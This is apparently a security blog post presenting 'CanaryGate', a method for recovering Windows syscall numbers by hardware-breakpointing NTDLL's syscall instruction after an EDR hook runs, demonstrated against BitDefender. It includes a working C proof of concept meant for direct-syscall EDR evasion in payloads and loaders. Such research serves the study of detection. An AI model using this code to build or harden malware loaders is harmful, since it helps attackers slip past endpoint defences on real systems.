# CanaryGate - A silly direct syscall method

I've been taking some [Sektor7](https://institute.sektor7.net) courses recently,
and part of that involved learning about **Hells Gate**.

Basically, Hells Gate is a memoization process that finds and caches important
Windows syscall numbers at run-time. It places them into what they call a "VX
Table". This is in contrast to tools like `SysWhispers` that create the table at
compile-time and place it into the payload/loader binary.

At run-time syscall numbers can be recovered using various techniques such as:

1. Reading the syscall numbers from a "fresh copy" of NTDLL

2. Creating a suspended process and reading the syscall numbers from the version
   of NTDLL in that process (Perun's Fart)

3. Taking advantage of predictable ordering in NTDLL exports as it relates to
   the syscall numbers of the exports (Halo's Gate)

In this blog post, I will describe yet another method for doing the recovery of
syscall numbers, I call this technique **CanaryGate** though it likely has some
other name that I'm not aware of.

The project can be [found on GitHub here](https://github.com/cramppet/canary-gate)

# TL;DR

CanaryGate exploits a design flaw in certain EDRs (like BitDefender). The flaw
is that the EDRs re-use the existing `syscall` instruction within the NTDLL
stubs.

This means that supposing you make an innocuous call to a hooked function, the
hook logic will eventually result in the execution of the existing `syscall`
instruction.

Recall the way that syscalls are performed on Windows: the System Service Number
(SSN) is stored within the `rax` register before the `syscall` instruction is
executed.

By hooking the existing `syscall` instruction, we can capture the moment after
the EDR hook has executed. For the implementation of their hook to work, they
must have loaded the SSN into `rax` at that point in time.

# PoC code

```c
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef struct _hook { HANDLE hThread; void* addr; } hook_t;

LONG Handler(PEXCEPTION_POINTERS args) {
  PCONTEXT ctx = args->ContextRecord; 
  PEXCEPTION_RECORD exc = args->ExceptionRecord;
  if (exc->ExceptionCode == EXCEPTION_SINGLE_STEP) {
    printf("Handler caught exception: %p, RAX = 0x%llx\n", ctx->Rip, ctx->Rax);
    ctx->Dr0 = 0;
    ctx->Dr6 = 0;
    ctx->Dr7 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
  }
  return EXCEPTION_CONTINUE_SEARCH;
}

void set_hook(hook_t* args) {
  CONTEXT ctx = {0};
  ctx.ContextFlags = CONTEXT_ALL;
  SuspendThread(args->hThread);
  GetThreadContext(args->hThread, &ctx);
  ctx.Dr0 = args->addr;
  ctx.Dr6 = 0;
  ctx.Dr7 = 1;
  SetThreadContext(args->hThread, &ctx);
  ResumeThread(args->hThread);
}

int main() {
  HMODULE ntdll = GetModuleHandleA("NTDLL.DLL");
  PBYTE func = GetProcAddress(ntdll, "NtQueryInformationProcess");
  DWORD i = 0;
  hook_t hook = {0};
  
  //
  // Locate desired NTDLL function, we assume it has a "syscall" instruction
  // preserved
  //

  while (1) {
    if (func[i] == 0x0F && func[i+1] == 0x05) {
      printf("Found syscall instruction at: %p\n", func + i);
      hook.addr = func + i;
      break;
    }
    printf("Byte value = 0x%x\n", func[i]);
    i += 1;
  }

  //
  // Get a non-pseudohandle for our current thread and add the exception handler
  // (hook) to capture the RAX value after the EDR hook has executed
  //

  hook.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
  AddVectoredExceptionHandler(1, Handler);

  //
  // Create another thread to create the hook in our thread context
  //

  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)set_hook, &hook, 0, NULL);
  Sleep(10000);

  //
  // Make the "canary call" in order to reveal the syscall number
  //

  printf("Calling function...\n");

  PROCESS_BASIC_INFORMATION info = {0};
  ((NtQueryInformationProcess_t*)func)(-1, ProcessBasicInformation, &info, sizeof(PROCESS_BASIC_INFORMATION), NULL);

  printf("Exiting...\n");

  return 0;
}
```

# Detailed Discussion

The image shown below was run against the freeware version of the `BitDefender`
AV/EDR tool. That implementation uses hooking on functions like
`NtQueryInformationProcess`, their hooks are implemented such that they re-use
the existing syscall and thus we can try to "doubly-hook" the call.

![BitDefender Hook Implementation](./bitdefender-hook.png)

Our PoC searches the memory of the NTDLL stub for `NtQueryInformationProcess`
looking for the byte pattern of the `syscall` instruction (`0x0F05`). Once
found, it uses an Intel hardware breakpoint via the x86_64 debug registers
combined with a vectored exception handler to perform the hook.

It's worth pointing out that this PoC is patchless so if the EDR performs a
checksum on the doubly-hooked NTDLL stubs, they would not notice a difference.
Still, hardware breakpoints are relatively easy to detect (you just have to
examine the `CONTEXT` of the calling thread) so another mechanism would likely
be better.

Once the target is hooked, we perform a "canary call", we call the function with
the most unsuspicious set of arguments we possibly can. The point of the call is
to trigger the EDR hook, have it succeed, and eventually hit our secondary hook.

You can see in the image that our call is made, our second hook is hit, and by
examining the thread context when our second hook was hit, we were able to
recover the syscall number of `NtQueryInformationProcess` as being `0x19`.

What's left to turn this into a full implementation of direct syscalling is to
simply re-use the code from Hell's Gate to build the VX table and then use it to
perform syscalls directly. I've left this as an exercise for the reader ;)
